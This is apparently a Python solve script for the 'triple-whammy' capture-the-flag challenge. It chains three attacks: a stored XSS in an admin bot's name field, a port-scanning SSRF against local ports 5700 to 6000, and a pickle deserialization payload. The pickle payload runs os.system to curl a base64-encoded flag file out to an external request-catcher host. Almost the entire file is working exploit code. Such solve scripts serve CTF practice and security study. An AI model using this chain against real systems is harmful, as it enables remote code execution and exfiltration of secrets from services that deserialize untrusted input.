import requests
import pickle
import os

ADMIN_BOT = "http://127.0.0.1:40004"
# ADMIN_BOT = "https://triple-whammy-admin.chal.cyberjousting.com"

# pickle insecure deserialization exploit to leak the flag
class Exploit:
	def __reduce__(self):
		return (os.system, ("curl https://abcdsss.requestcatcher.com/?a=$(cat /ctf/flag.txt | base64)",))
	def __str__(self):
		return "Hello Pickle!"

payload = pickle.dumps(Exploit()).hex()
print("pickle payload:", payload)

# XSS payload to bruteforce all ports from 5700 to 6000 for the pickle service and send the pickle payload to all of them
xss = ('''<script>
for (let i = 5700; i <= 6000; i++) {
fetch("http://127.0.0.1:1337/query", {
method: 'POST',
headers: {
"Content-Type": "application/json"
},
body: JSON.stringify({url: 'http://127.0.0.1:'+i+'/pickle?pickle=%s'})
});
}
</script>''' % payload).replace("\n", "").replace("+", "%2B")

print(xss)
r = requests.post(ADMIN_BOT + "/visit", data={"path": "?name=" + xss})	# the name field has an xss, so we can have the admin bot run arbitrary javascript by writing it in the name field
print(r.text)
